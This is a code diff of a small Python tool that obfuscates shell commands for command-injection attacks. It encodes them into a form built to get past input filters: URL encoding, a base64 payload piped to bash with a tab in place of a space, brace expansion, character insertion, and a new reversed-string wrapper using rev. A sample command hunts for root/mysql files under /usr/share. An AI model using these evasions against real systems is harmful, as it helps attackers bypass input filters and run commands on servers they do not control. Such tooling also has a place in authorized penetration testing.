@@ -1,10 +1,9 @@
-import re
-from pprint import pprint
 import base64
 
-user_command = 'find /usr/share/ | grep root | grep mysql | tail -n 1'
+# user_command = 'find /usr/share/ | grep root | grep mysql | tail -n 1'
+#
+# output_commands = []
 
-output_commands = []
 
 def special_character_to_url_encode(command):
     url_encoding_list = [command]
@@ -19,15 +18,19 @@ def special_character_to_url_encode(command):
     # pprint(url_encoding_list)
     return url_encoding_list
 
+
 def base_64_encode(command):
     encoded_bytes = base64.b64encode(command.encode("utf-8"))
     encoded_string = str(encoded_bytes, "utf-8")
-    return encoded_string
+    payload = f'bash<<<$(base64%09-d<<<{encoded_string})'
+    return payload
+
 
 def brace_expansion(command):
     space_replaced = command.replace(" ", ",")
-    braced_output = str('{'+space_replaced+'}')
+    braced_output = str('{' + space_replaced + '}')
     return braced_output
+
 
 def character_insertion(command):
     final_command = ''
@@ -44,8 +47,10 @@ def character_insertion(command):
         return final_command
 
 
+def reverse_commands(command):
+    reved_command = f"$(rev<<<'{command[::-1]}')"
+    return reved_command
 
 
-
-if __name__ == '__main__':
-    print(character_insertion(user_command))
+# if __name__ == '__main__':
+#     reverse_commands(user_command)
